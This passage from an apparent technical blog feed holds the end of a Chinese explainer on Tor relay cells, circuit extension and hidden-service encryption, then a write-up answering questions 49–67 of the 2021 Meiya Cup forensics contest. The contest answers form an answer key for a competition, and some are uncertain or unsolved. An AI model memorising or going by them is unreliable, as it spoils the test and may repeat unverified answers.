并且要对这两个字段进行检查和重新赋值(也就是重新封装<strong>509B</strong>的payload部分)</p><p>在此之前<code>Client</code>已经为<strong>498B</strong>的实际data payload加好了<code>RELAY</code>头,其中的<code>recognized</code>和<code>digest</code>字段只有本次传输的接收方能够正确识别</p><p>这个Tor cell到达每一个<code>OR</code>,并被该<code>OR</code>进行一次解密之后: 如果该<code>OR</code>不是目标节点,那么<strong>509B</strong>的payload<strong>实际上仍然处于密文状态</strong>, 那么这个<code>OR</code>实际上检查的是<code>recognized</code>和<code>digest</code><strong>这个位置上的字节值</strong>(严格来说密文状态下这些字段是不存在的,只是到<strong>相应位置</strong>去检测), 当检查无法识别后,<code>OR</code>再重新为其增加长度为3B的tor头部字段(也就是<code>Circuit ID</code>和<code>Command</code>字段)</p><p>(注意: 每个<code>OR</code>和<code>OR</code>之间的链路的<code>circuitID</code>都不同, 因此<code>OR</code>会在重新添加头部字段的过程中将<code>circuitID</code>换成它同下一个<code>OR</code>之间链路的<code>circuitID</code>)</p></blockquote><br><p>由此其实可以看出:</p><p>对于一个512B的cell,其前3B的tor头部分(<code>circuitID</code>和<code>command</code>)是明文的,后面509B的payload(其中还包括relay头)是在tor的逻辑下进行加密的</p><p>这样的cell在按照计算机网络的五层结构向下封装时,<strong>还会被TLS层进行加密</strong>, 因此如果在传输链路上截获流量是无法识别出流量类型的, 但是如果攻击者控制了<code>entry</code>这样的节点,便可以提取此处经TLS解密后的流量,从而观察到3字节的tor明文头</p><br><h3 id="3-4-2RELAY-EXTEND-2-x2F-RELAY-EXTENDED-2"><a href="#3-4-2RELAY-EXTEND-2-x2F-RELAY-EXTENDED-2" class="headerlink" title="3.4.2RELAY_EXTEND(2)&#x2F;RELAY_EXTENDED(2)"></a>3.4.2RELAY_EXTEND(2)&#x2F;RELAY_EXTENDED(2)</h3><p><code>RELAY_EXTEND(2) cell</code>由<code>Client</code>发出, 用于<strong>在建立链路阶段告知当前链路末端的<code>OR</code>去扩充链路长度</strong> (和下一个<code>OR</code>建立连接)</p><p>例如<code>Client</code>向<code>Entry</code>发送<code>RELAY_EXTEND(2) cell</code>, 告知其去连接某个<code>OR</code>, 这个<code>OR</code>也就是<code>Client</code>正试图建立的链路上的<code>Middle</code>节点(此节点的信息会包含在这个cell的payload中),  <code>Entry</code>在解密得到明文的payload后, 就知道了应该去找那个<code>OR</code>建立连接, 并向这个<code>OR</code>发送命令字段为<code>CREATE</code>的 Tor cell. </p><p><code>RELAY_EXTENDED(2) cell</code>是在<code>OR</code>同下一个节点建立连接后, 对<code>RELAY_EXTEND(2) cell</code>的发出者的响应, 表示告知发出者已经按照其指示同下一个节点建立好了连接. </p><br><p><code>RELAY_EXTEND(2) cell</code>的payload包括以下内容: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NSPEC      (Number of link specifiers)     [1 byte]</span><br><span class="line">NSPEC times:</span><br><span class="line">LSTYPE (Link specifier type)           [1 byte]</span><br><span class="line">LSLEN  (Link specifier length)         [1 byte]</span><br><span class="line">LSPEC  (Link specifier)                [LSLEN bytes]</span><br><span class="line">HTYPE      (Client Handshake Type)         [2 bytes]</span><br><span class="line">HLEN       (Client Handshake Data Len)     [2 bytes]</span><br><span class="line">HDATA      (Client Handshake Data)         [HLEN bytes]</span><br></pre></td></tr></table></figure><p>其中<code>link specifiers</code>描述了要连接的下一个节点的信息(IP,端口等),以及使用什么方式去连接它</p><p>另外, 这一部分是和<code>CREATE2 cell</code>的<a href="#3.3">payload</a>是一致的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTYPE      (Client Handshake Type)         [2 bytes]</span><br><span class="line">HLEN       (Client Handshake Data Len)     [2 bytes]</span><br><span class="line">HDATA      (Client Handshake Data)         [HLEN bytes]</span><br></pre></td></tr></table></figure><p>当前链路末端会直接将这一部分封装到即将发给下一个节点的 <code>CREATE cell</code>中,作为其payload.</p><p>待扩展的<code>OR</code>收到<code>CREATE cell</code>后, 就可以利用客户端发送的握手数据来生成会话密钥并完成握手</p><p>随后,它会向之前的<code>OR</code>回复一个<code>CREATED cell</code></p><p>之前的<code>OR</code>收到后,取出<code>CREATED cell</code>的payload,将其封装成<code>EXTENDED cell</code>,并将其发回<code>Client</code></p><p>至此,<code>Client</code>同待扩展<code>OR</code>的握手完成, 链路也就扩展到了下一个节点上</p><br><h3 id="3-4-3RELAY-BEGIN-x2F-RELAY-CONNECTED"><a href="#3-4-3RELAY-BEGIN-x2F-RELAY-CONNECTED" class="headerlink" title="3.4.3RELAY_BEGIN&#x2F;RELAY_CONNECTED"></a>3.4.3RELAY_BEGIN&#x2F;RELAY_CONNECTED</h3><p>由<code>Client</code>发出, 链路末端的<code>OR</code>(也就是<code>Exit</code>)接受, <code>Client</code>指示其去与要访问的服务器建立连接.</p><p><code>RELAY_BEIGIN cell</code>的payload结构:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ADDRPORT [nul-terminated string] 包含目标服务器的IP和端口</span><br><span class="line">FLAGS    [4 bytes] </span><br><span class="line"># FLAG的值和含义:</span><br><span class="line">      1 -- IPv6 okay.  We support learning about IPv6 addresses and</span><br><span class="line">           connecting to IPv6 addresses.</span><br><span class="line">      2 -- IPv4 not okay.  We don&#x27;t want to learn about IPv4 addresses</span><br><span class="line">           or connect to them.</span><br><span class="line">      3 -- IPv6 preferred.  If there are both IPv4 and IPv6 addresses,</span><br><span class="line">           we want to connect to the IPv6 one.  (By default, we connect</span><br><span class="line">           to the IPv4 address.)</span><br><span class="line">      4..32 -- Reserved. Current clients MUST NOT set these. Servers</span><br><span class="line">           MUST ignore them.</span><br></pre></td></tr></table></figure><p>如果<code>Exit</code>无法找到目标server或者无法同目标server建立TCP连接,它会返回<code>RELAY_END cell</code></p><p>如果成功建立连接,则返回<code>RELAY_CONNECTED cell</code>,其payload结构为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    The IPv4 address to which the connection was made [4 octets]</span><br><span class="line">    A number of seconds (TTL) for which the address may be cached [4 octets]</span><br><span class="line">or</span><br><span class="line">    Four zero-valued octets [4 octets]</span><br><span class="line">    An address type (6)     [1 octet]</span><br><span class="line">    The IPv6 address to which the connection was made [16 octets]</span><br><span class="line">    A number of seconds (TTL) for which the address may be cached [4 octets]</span><br></pre></td></tr></table></figure><p>当连接建立成功之后,<code>Client</code>和server就可以通过<code>RELAY_DATA cells</code>来发送应用数据了</p><blockquote><p>在0.2.3.1-alpha版本之前,如果<code>exit</code>不支持”optimistic data”</p><p>那么<code>Client</code>应该等待至收到<code>RELAY_CONNECTED cell</code> 后才能够开始发送<code>RELAY_DATA cells</code></p><p>后面的版本中,不必再有这个等待过程, <code>Client</code>发送完<code>RELAY_BEGIN cell</code>后可以立即开始发送<code>RELAY_DATA cells</code></p></blockquote><br><br><h2 id="3-5REALY-EARLY-cell"><a href="#3-5REALY-EARLY-cell" class="headerlink" title="3.5REALY_EARLY cell"></a>3.5REALY_EARLY cell</h2><p><code>REALY_EARLY cell</code>是一种特殊的<code>REALY cell</code></p><p><strong>目前新版本的Tor规定, 携带<code>EXTEND</code>命令的 <code>REALY cell</code> 必须改为 <code>REALY_EARLY cell</code></strong> , 并且规定: 如果一个节点收到了累计8个以上<code>outbound</code>方向 (自客户端到服务器) 的<code>REALY_EARLY cell</code>,  或者收到了任何来自<code>inbound</code>方向 (自服务器至客户端) 的<code>REALY_EARLY cell</code> ,  则此节点应该<strong>立刻关闭当前的连接</strong></p><p>因此可以看出, <code>REALY_EARLY cell</code>的意义是<strong>防止恶意攻击者建立过长的链路以进行DOS等形式的攻击</strong>, 那么如果某个<code>OR</code>收到了大于8个 <code>REALY_EARLY cell</code> 信元,就说明<code>Client</code>或者某些<code>OR</code>在恶意地通过发送<code>RELAY_EXTENDED(2) cell</code>来创建过长的链路, 从而耗尽Tor 网络的资源, 达到DOS攻击的效果</p><p>尽管这样做并不能完全地阻止攻击者创建过长的链路, 但是会增加其成本,攻击者需要至少在每8跳处指定一个恶意中继.(每连接7跳后,由该恶意中继继续构造<code>RELAY_EXTENDED(2) cell</code>并向下发送,因此前面构建的链路中的那些正常的<code>OR</code>并不能收到第8个<code>REALY_EARLY cell</code>,也就不会断开连接)</p><br><hr><br><h1 id="4-建立连接和访问"><a href="#4-建立连接和访问" class="headerlink" title="4_建立连接和访问"></a><span id="part_4">4_建立连接和访问</span></h1><p>这里直接上一个画得特明白的图:</p><img id= "RELAY_cell" src="/images/tor-spec/9.png" alt="Tor建立链路以及访问某服务器的过程"  /><p>在建立链路时, <code>Client</code>和<code>Entry</code>通过<code>CREATE2 cell</code>和<code>CREATED2 cell</code>来进行握手, 在这个过程中双方会生成一对会话密钥,这里称为<code>k1</code></p><p>之后, <code>Client</code>为了同<code>Middle</code>进行握手建立连接, 它会向<code>Entry</code>发送<code>RELAY_EXTEND2 cell</code> , 和<code>Middle</code>的握手数据包含在这个cell的relay_payload中. <code>Client</code>使用<code>k1</code>加密了这个cell的payload(注意relay_payload和payload说的不是同一个东西), 因此只有<code>Entry</code>能够解密并识别其中的<code>RELAY_EXTEND2</code>指令.</p><p><code>Entry</code>能够解密并识别了<code>RELAY_EXTEND2</code>指令, 取出relay_payload(也就是<code>Client</code>要发送给<code>Middle</code>的握手数据), 将其封装到一个<code>CREATE2 cell</code>中并发送给<code>Middle</code></p><p><code>Middle</code>会将自己的握手响应数据封装在<code>CREATED2 cell</code>中发给<code>Entry</code>, <code>Entry</code>再将其取出并封装到<code>RELAY_EXTENDED2</code>中发回给<code>Client</code>. 在此过程中, <code>Client</code>和<code>Middle</code>就协商得到了会话密钥<code>k2</code></p><p><code>Client</code>同<code>Exit</code>握手的过程同理, 只不过从<code>Client</code>发出的<code>RELAY_EXTEND2 cell</code>的payload会先使用<code>k2</code>加密, 再使用<code>k1</code>加密, 这样<code>Entry</code>会先使用<code>k1</code>对其进行一次解密, 发现仍然无法识别后(<a href="#part_3.4.1">参考3.4.1</a>), 就会将其继续发送给<code>Middle</code>, <code>Middle</code>使用<code>k2</code>再进行一次解密后, 发现可以识别到<code>RELAY_EXTEND2 cell</code>, 就会向前面的过程一样去找到<code>Exit</code>并向其发送<code>CREATE2 cell</code>.</p><p>在链路建立完成时, <code>Client</code>拥有三个会话密钥, 分别对应<code>Entry</code>,<code>Middle</code>和<code>Exit</code></p><p>那么,当<code>Client</code>准备通过建立好的链路请求某个服务是, 它发送的请求包就是这种形式:(只有<code>Exit</code>能够最后解密得到目标服务的IP和端口,并由此发起请求)</p><img id= "RELAY_cell" src="/images/tor-spec/10.png" alt=""  /><br><br><p>访问<code>HS</code>建立连接的过程见<a href="#part_1.3">1.3</a></p><p><code>HS</code>在创建<code>IPO</code>链路时, 先按照常规流程建立三跳链路, 然后向最后一个<code>OR</code>发送一个 命令字段为<code>RELAY</code>, relay的命令字段为<code>establish_intro</code> ((relay命令字段值为32) 的cell (参考<a href="#relay_command">RELAY_command字段值列表</a>)</p><p>然后该<code>OR</code>回复一个relay命令字段为<code>intro_established</code> (relay命令字段值为38) 的cell, 如此, 该<code>OR</code>就成为了这个<code>HS</code>的 <code>IPO</code></p><p>同理, <code>Client</code>在建立<code>RPO</code>链路时也是一样的过程, 建立三跳链路后向最后一个节点发送relay的命令字段为<code>establish_rendezvous</code>((relay命令字段值为33)的cell. </p><p>然后该<code>OR</code>回复一个relay命令字段为<code>redezvous_established</code> (relay命令字段值为39) 的cell, 如此, 该<code>OR</code>就成为了这个<code>Client</code>的 <code>RPO</code></p><br><blockquote><p>当<code>Client</code>访问<code>HS</code>时,</p><p><code>Client</code>和<code>HS</code>共同持有一对会话密钥<code>k&#39;</code>, 在协商这对密钥过程中, <code>Client</code>的握手信息是通过<code>IPO</code>链路发送给<code>HS</code>的, 而<code>HS</code>的握手信息是通过<code>RPO</code>链路发给<code>Client</code>的.(参考<a href="#part_1.3">1.3</a>).  <code>Client</code>向<code>HS</code>发送信息时,首先使用此密钥进行加密(<strong>也就是说,此为最内层的加密</strong>)</p><p><code>Client</code>持有<code>k&#39;</code>,<code>k1</code>,<code>k2</code>,<code>k3</code> HS持有<code>k&#39;</code>,<code>k4</code>,<code>k5</code>,<code>k6</code>(<strong>对应的是用于传输应用数据的<code>RPO</code>链路上的六个节点</strong>)</p><p>也就是说,Tor cell在<code>Client</code>处会被加密四层, 当Tor cell到达<code>RPO</code>并经过第三次解密后仍是被<code>Client</code>和<code>HS</code>的密钥加密的</p><p>随后,<code>RPO</code>将Tor cell继续转发,<code>OR4</code>,<code>OR5</code>,<code>OR6</code>会使用各自的密钥对其<strong>加密</strong> (这个过程相当于<code>RPO</code>是三跳链路中的服务端, 而<code>HS</code>是三跳链路中的客户端), 所以Tor cell到达<code>HS</code>时,又是被4层加密的<code>,HS</code>会依次使用<code>k6</code>,<code>k5</code>,<code>k4</code>,<code>k&#39;</code>对其逐层解密,获得明文.</p><p><code>HS</code>给<code>Client</code>发数据也是类似的过程</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Tor </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021美亚杯_团队赛下</title>
      <link href="/post/6074697.html"/>
      <url>/post/6074697.html</url>
      
        <content type="html"><![CDATA[<h1 id="PART5常威手机-USB"><a href="#PART5常威手机-USB" class="headerlink" title="PART5常威手机+USB"></a>PART5常威手机+USB</h1><h2 id="49常威手机中Telegram首次下载的时间"><a href="#49常威手机中Telegram首次下载的时间" class="headerlink" title="49常威手机中Telegram首次下载的时间"></a>49常威手机中Telegram首次下载的时间</h2><blockquote><p>【填空题】常威手机中的 Telegram有可能是在2021年9月24日_<strong>12</strong>__时44分58秒UTC+8）首次下载的。（请以阿拉伯数字输入答案）（2分）</p></blockquote><p>从安装的应用程序中可以找到<code>Telegram</code>的购买日期,换算成<strong>UTC+8</strong>时间后就是12时</p><img src="/images/meiya-2021-03/0.png" alt="image-0" style="zoom:67%;" /><br><h2 id="50常威手机曾经连接的无人机名称"><a href="#50常威手机曾经连接的无人机名称" class="headerlink" title="50常威手机曾经连接的无人机名称"></a>50常威手机曾经连接的无人机名称</h2><p>在相关位置中可以找到无人机的飞行记录</p><img src="/images/meiya-2021-03/1.png" alt="image-1" style="zoom:67%;" /><p>在右边的详细信息里可以看到名称是<code>SSPARK</code></p><br><h2 id="51常威手机中档案”dji1633936161416-mp4”的解像度"><a href="#51常威手机中档案”dji1633936161416-mp4”的解像度" class="headerlink" title="51常威手机中档案”dji1633936161416.mp4”的解像度"></a>51常威手机中档案”dji1633936161416.mp4”的解像度</h2><blockquote><p>【填空题】常威手机中，档案”dji1633936161416.mp4”的解像度是___1280720____（例如是1920X1280，请输入19201280）。（1分）</p></blockquote><p>过滤出来这个视频并导出</p><img src="/images/meiya-2021-03/2.png" alt="image-2" style="zoom:67%;" /><p>这里文件名和题目中所给的文件名并不是很符合,题目中给的那个文件名中的<code>1633936161416</code>明显是一个时间戳数据</p><p>把这个时间戳转换一下,发现和找到的这个视频的时间大致能够对应上</p><img src="/images/meiya-2021-03/3.png" alt="image-3" style="zoom:67%;" /><p>导出视频后查看分辨率:</p><img src="/images/meiya-2021-03/4.png" alt="image-4" style="zoom:67%;" /><br><h2 id="52常威手机中「安心出行」安装包的哈希值"><a href="#52常威手机中「安心出行」安装包的哈希值" class="headerlink" title="52常威手机中「安心出行」安装包的哈希值"></a>52常威手机中「安心出行」安装包的哈希值</h2><blockquote><p>【填空题】常威手机中，发现于网络上下载的软件“安心出行”安装档的哈希值（MD5）是？（请以英文全大写及阿拉伯数字回答）（2分）</p></blockquote><p>这里可以找到该安装包的包名</p><img src="/images/meiya-2021-03/5.png" alt="image-5" style="zoom:67%;" /><p>根据源文件路径找到安装包文件并导出</p><img src="/images/meiya-2021-03/6.png" alt="image-6" style="zoom:67%;" /><p>计算<code>md5</code>即可</p><img src="/images/meiya-2021-03/7.png" alt="image-7" style="zoom:67%;" /><br><h2 id="53「安心出行」设计的安全许可权限"><a href="#53「安心出行」设计的安全许可权限" class="headerlink" title="53「安心出行」设计的安全许可权限"></a>53「安心出行」设计的安全许可权限</h2><blockquote><p>【多选题】常威手机中执行软件“安心出行”（版本21.3）中涉及以下安全许可？（2分）</p><p>A android.permission.ACCESS_WIFI_STATE获取WiFi状态</p><p>B android.permission.BATTERY_STATS电量统计</p><p><strong>C Android.permission.VIBRATE使用振动</strong></p><p>D android.permission.CONTROL_LOCATION_UPDATES控制定位更新</p><p><strong>E android.permission.CAMERA拍照权限</strong></p></blockquote><p>导入雷电APP分析软件后查看权限:</p><img src="/images/meiya-2021-03/8.png" alt="image-8" style="zoom:67%;" /><br><h2 id="54哪个不是「安心出行」安装包的签名算法"><a href="#54哪个不是「安心出行」安装包的签名算法" class="headerlink" title="54哪个不是「安心出行」安装包的签名算法"></a>54哪个不是「安心出行」安装包的签名算法</h2><blockquote><p>【多选题】常威手机中软件“安心出行”（版本2.1.3）的安装档（.apk）中，哪个不是它的签名算法？（3分）</p><p><strong>A. MD5withRSA</strong></p><p>B. SHA256withRSA</p><p><strong>C. SHA256withDSA</strong></p><p><strong>D. MD5withDSA</strong></p></blockquote><img src="/images/meiya-2021-03/9.png" alt="image-9" style="zoom:67%;" /><p>选不是的,所以是另外三个</p><br><h2 id="55「安心出行」可能会连接到哪个网站"><a href="#55「安心出行」可能会连接到哪个网站" class="headerlink" title="55「安心出行」可能会连接到哪个网站"></a>55「安心出行」可能会连接到哪个网站</h2><blockquote><p>【多选题】于常威的手机中执行软件“安心出行”（版本1）可能会连接至哪一个网站？（2分）</p><p><strong>A <a href="https://back-home-..........pages.dev/">https://back-home-..........pages.dev</a></strong></p><p>B org.chromium…….a5b80edf82b436506</p><p><strong>C. org.chromium…….a5b80edf82b436506_v2</strong></p><p>D.<a href="https://back-home-........pages.dev/manifest.json">https://back-home-........pages.dev/manifest.json</a></p></blockquote><p>模拟器抓包发现并没有发现选项中的网站</p><img src="/images/meiya-2021-03/10.png" alt="image-10" style="zoom:67%;" /><p>这才发现刚刚导出的是版本2.13….</p><img src="/images/meiya-2021-03/11.png" alt="image-11" style="zoom:67%;" /><p>版本1是另外一个:</p><img src="/images/meiya-2021-03/12.png" alt="image-12" style="zoom:67%;" /><p>导出另外这个apk,并使用雷电分析,这里app自动打开的网页已经可以确定A选项了</p><img src="/images/meiya-2021-03/13.png" alt="image-13" style="zoom:67%;" /><p>但是看选项的意思,BC里边应该还得选出来一个… 那么就得以org为关键词来搜索了</p><p>反编译搜索org,基本上都是带着v2的,所以C项也选上了</p><img src="/images/meiya-2021-03/14.png" alt="image-14" style="zoom:67%;" /><br><br><p>使用取证大师加载USB镜像,发现什么都没有,应该是被格式化过了</p><p>因此先进行恢复(格式化恢复和签名恢复都试了)</p><h2 id="56常威的苹果手提计算机的开机密码-USB中可能有相关数据"><a href="#56常威的苹果手提计算机的开机密码-USB中可能有相关数据" class="headerlink" title="56常威的苹果手提计算机的开机密码(USB中可能有相关数据)"></a>56常威的苹果手提计算机的开机密码(USB中可能有相关数据)</h2><blockquote><p>【单选题】在常咸苹果手提计算机，用户开机密码是什么？提示：常成USB设备中可能有相关数据）（3分）</p><p>A. C##sthegoa#</p><p>B. Draw##fgd#f</p><p>C. Co#kkfid#dd</p><p>D. App#is#won</p></blockquote><p>这里直接找基本上是找不到的,基本上要<strong>原始数据搜索</strong>搜选项了…</p><p>注意这里需要选中搜索勾选文件,不然好像不会将恢复的文件包括进去搜索…</p><img src="/images/meiya-2021-03/15.png" alt="image-15" style="zoom:67%;" /><p>A选项能够搜索到:</p><img src="/images/meiya-2021-03/16.png" alt="image-16" style="zoom:67%;" /><p>密码是<strong>cpisthegoat</strong>  (cris paul is the goat?🤐)</p><br><h2 id="57常威U盘内有多少磁盘分隔区"><a href="#57常威U盘内有多少磁盘分隔区" class="headerlink" title="57常威U盘内有多少磁盘分隔区"></a>57常威U盘内有多少磁盘分隔区</h2><p>使用取证大师恢复完毕之后,制作镜像,然后使用X-way打开</p><img src="/images/meiya-2021-03/17.png" alt="image-17" style="zoom:67%;" /><p>查看MBR表,能够看到4个分区:</p><img src="/images/meiya-2021-03/18.png" alt="image-18" style="zoom:67%;" /><br><h2 id="58在常威U盘内有多少份excel文件"><a href="#58在常威U盘内有多少份excel文件" class="headerlink" title="58在常威U盘内有多少份excel文件"></a>58在常威U盘内有多少份excel文件</h2><p>这里官方给的答案是1个</p><p>但是如果进行了签名恢复的话,能够看见4个</p><img src="/images/meiya-2021-03/19.png" alt="image-19" style="zoom:67%;" /><p>其中<strong>客户资料</strong>和 <strong>未分配簇_00001</strong>是一样的</p><p>所以应该是3个excel文件</p><br><h2 id="59常威U盘内含有多少个客户数据"><a href="#59常威U盘内含有多少个客户数据" class="headerlink" title="59常威U盘内含有多少个客户数据"></a>59常威U盘内含有多少个客户数据</h2><p>将上一题找到的<code>客户资料.xlsx</code>导出,能够看见50条数据</p><img src="/images/meiya-2021-03/20.png" alt="image-20" style="zoom:67%;" /><br><h2 id="60以下哪个客户数据储存在常威U盘内"><a href="#60以下哪个客户数据储存在常威U盘内" class="headerlink" title="60以下哪个客户数据储存在常威U盘内"></a>60以下哪个客户数据储存在常威U盘内</h2><blockquote><p>【多选题】以下哪个客户数据储存在常威U盘内？（3分）</p><p><a href="mailto:&#x41;&#x2e;&#x6a;&#109;&#117;&#x61;&#116;&#x31;&#x40;&#x72;&#101;&#102;&#x65;&#114;&#x65;&#x6e;&#x63;&#x65;&#46;&#99;&#111;&#109;">&#x41;&#x2e;&#x6a;&#109;&#117;&#x61;&#116;&#x31;&#x40;&#x72;&#101;&#102;&#x65;&#114;&#x65;&#x6e;&#x63;&#x65;&#46;&#99;&#111;&#109;</a></p><p><a href="mailto:&#x42;&#46;&#x63;&#x67;&#x65;&#x72;&#x61;&#117;&#100;&#x67;&#x40;&#x66;&#x6f;&#x72;&#x62;&#101;&#x73;&#x2e;&#99;&#x6f;&#x6d;">&#x42;&#46;&#x63;&#x67;&#x65;&#x72;&#x61;&#117;&#100;&#x67;&#x40;&#x66;&#x6f;&#x72;&#x62;&#101;&#x73;&#x2e;&#99;&#x6f;&#x6d;</a></p><p><a href="mailto:C.cwarmishamo@admin.ch">C.cwarmishamo@admin.ch</a></p><p><a href="mailto:&#68;&#46;&#x61;&#x62;&#100;&#x64;&#x66;&#x64;&#x66;&#x40;&#x67;&#111;&#x6f;&#x67;&#108;&#x65;&#46;&#x63;&#x6f;&#109;">&#68;&#46;&#x61;&#x62;&#100;&#x64;&#x66;&#x64;&#x66;&#x40;&#x67;&#111;&#x6f;&#x67;&#108;&#x65;&#46;&#x63;&#x6f;&#109;</a></p><p><a href="mailto:&#69;&#46;&#x61;&#x6c;&#101;&#120;&#49;&#50;&#x33;&#x34;&#64;&#x61;&#112;&#112;&#x6c;&#x65;&#x2e;&#x63;&#111;&#109;">&#69;&#46;&#x61;&#x6c;&#101;&#120;&#49;&#50;&#x33;&#x34;&#64;&#x61;&#112;&#112;&#x6c;&#x65;&#x2e;&#x63;&#111;&#109;</a></p></blockquote><p>直接在上一题的excel文件中搜索就行</p><br><hr><br><h1 id="PART6常威MAC"><a href="#PART6常威MAC" class="headerlink" title="PART6常威MAC"></a>PART6常威MAC</h1><p>这里给了一个aff4格式的镜像,取证大师读取不了,但是可以用x-ways读取:(<strong>先使用X-ways创建新案件,然后在案件下添加镜像</strong>)</p><img src="/images/meiya-2021-03/21.png" alt="image-21" style="zoom:67%;" /><p>在<code>文件</code>–<code>创建磁盘镜像</code>处,将其制作成<code>e01</code>格式的镜像:</p><p>(花了20分钟左右,一开始会显得很慢,但不用担心),直接按默认设置压缩就行</p><img src="/images/meiya-2021-03/22.png" alt="image-22" style="zoom:67%;" /><p>制作完成后就可以使用取证大师加载了:</p><img src="/images/meiya-2021-03/23.png" alt="image-23" style="zoom:67%;" /><p>在第一个分区处,右键–<code>FileVault2解密</code></p><blockquote><p>FileVault是MAC的磁盘加密机制</p><img src="/images/meiya-2021-03/24.png" alt="image-24" style="zoom:67%;" /></blockquote><img src="/images/meiya-2021-03/25.png" alt="image-25" style="zoom:67%;" /><p>解密了磁盘之后,自动取证就可以了</p><h2 id="61常威MAC的上一个系统版本及现在运行系统版本"><a href="#61常威MAC的上一个系统版本及现在运行系统版本" class="headerlink" title="61常威MAC的上一个系统版本及现在运行系统版本"></a>61常威MAC的上一个系统版本及现在运行系统版本</h2><blockquote><p>常威MAC计算机上一个系统版本是甚么及现正运行哪一个版本的系统？（3分）</p><p><strong>A. Macos 10.11.6 and Macos 11.6</strong></p><p>B. Macos 10.115 and Macos 11.5</p><p>C. Macos 10.11. 4 and macos 11.6</p><p>D.以上皆非</p></blockquote><p>当前系统版本在系统信息处直接查看</p><img src="/images/meiya-2021-03/26.png" alt="image-26" style="zoom:67%;" /><p>要查看之前的系统版本,想到系统日志里应该有<strong>系统更新日志</strong></p><p>日志中筛选以下选项中带有的<strong>10.11</strong>就找到了</p><img src="/images/meiya-2021-03/27.png" alt="image-27" style="zoom:67%;" /><br><h2 id="62常威MAC的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机"><a href="#62常威MAC的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机" class="headerlink" title="62常威MAC的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机"></a>62常威MAC的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机</h2><blockquote><p>【多选题】常威MAC计算机的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机？（3分）</p><p><strong>A. Created</strong></p><p><strong>B. InodeMetaMod</strong></p><p><strong>C. FinderInfoChanged</strong></p><p>D. IsDirectory</p><p><strong>E. Owner Changed</strong></p></blockquote><p>常识题…记住好了</p><img src="/images/meiya-2021-03/28.png" alt="image-28" style="zoom:67%;" /><br><h2 id="63常威MAC曾连接哪个无线网络"><a href="#63常威MAC曾连接哪个无线网络" class="headerlink" title="63常威MAC曾连接哪个无线网络"></a>63常威MAC曾连接哪个无线网络</h2><blockquote><p>【多选题】常威MAC计算机曾连接哪一个无线网络SSID？（2分）</p><p><strong>A. wai wifi</strong></p><p><strong>B. wanchainew1</strong></p><p>C. central2</p><p>D. Hongkong1 </p></blockquote><p>在密码钥匙串中可以找到:</p><img src="/images/meiya-2021-03/29.png" alt="image-29" style="zoom:67%;" /><p>关于苹果的AirPort:</p><img src="/images/meiya-2021-03/30.png" alt="image-30" style="zoom:67%;" /><br><h2 id="64常威MAC的使用者什么时候将“隔空投送”（airdrop）转换至任何人模式"><a href="#64常威MAC的使用者什么时候将“隔空投送”（airdrop）转换至任何人模式" class="headerlink" title="64常威MAC的使用者什么时候将“隔空投送”（airdrop）转换至任何人模式"></a>64常威MAC的使用者什么时候将“隔空投送”（airdrop）转换至任何人模式</h2><blockquote><p>【单选题】常威MAC计算机的使用者甚么时候将“隔空投送”（airdrop）转换至任何人模式？（2分）</p><p>A.2021-10-21 16:5248（UTC+8）</p><p>B.2021-10-21 18:52:48（UTC+8）</p><p>C.2021-10-21 06:52:48（UTC+8）</p><p>D.2021-10-21 08:52:48（UTC+8）</p></blockquote><p>这题没找到…</p><br><h2 id="65常威MAC计算机的APFS储存容器的文件签名和偏移值"><a href="#65常威MAC计算机的APFS储存容器的文件签名和偏移值" class="headerlink" title="65常威MAC计算机的APFS储存容器的文件签名和偏移值"></a>65常威MAC计算机的APFS储存容器的文件签名和偏移值</h2><blockquote><p>常威MAC计算机的APFS储存容器的文件签名是 <strong>NXSB</strong>偏移值为<strong>32</strong>(例如NTFS及请输入NTFS64）。（2分）</p></blockquote><p>常识题:</p><p><strong>苹果文件系统(Apple File System,APFS)</strong></p><p>其签名就在镜像文件16进制视图的起始位置,从十六进制视图也可以看出其偏移量是十六进制的20,也就是32</p><img src="/images/meiya-2021-03/31.png" alt="image-31" style="zoom:67%;" /><br><h2 id="66常威MAC的镜像档案内，总共有多少个系统默认的卷标"><a href="#66常威MAC的镜像档案内，总共有多少个系统默认的卷标" class="headerlink" title="66常威MAC的镜像档案内，总共有多少个系统默认的卷标"></a>66常威MAC的镜像档案内，总共有多少个系统默认的卷标</h2><blockquote><p>【单选题】常威MAC计算机的镜像档案内，总共有多少个系统默认的卷标？（1分）</p><p>A.4</p><p><strong>B.5</strong></p><p>C.6</p><p>D.7</p></blockquote><img src="/images/meiya-2021-03/32.png" alt="image-32" style="zoom:67%;" /><p>第一个(Chris Data)是属于用户的,剩下五个是系统默认的卷标</p><br><h2 id="67常威MAC的使用者上一次关闭浏览器时，正在浏览多少个网页"><a href="#67常威MAC的使用者上一次关闭浏览器时，正在浏览多少个网页" class="headerlink" title="67常威MAC的使用者上一次关闭浏览器时，正在浏览多少个网页"></a>67常威MAC的使用者上一次关闭浏览器时，正在浏览多少个网页</h2><p>找到最后会话记录,其中共有十条记录:</p><img src="/images/meiya-2021-03/33.png" alt="image-33" style="zoom:67%;" /><br><h2 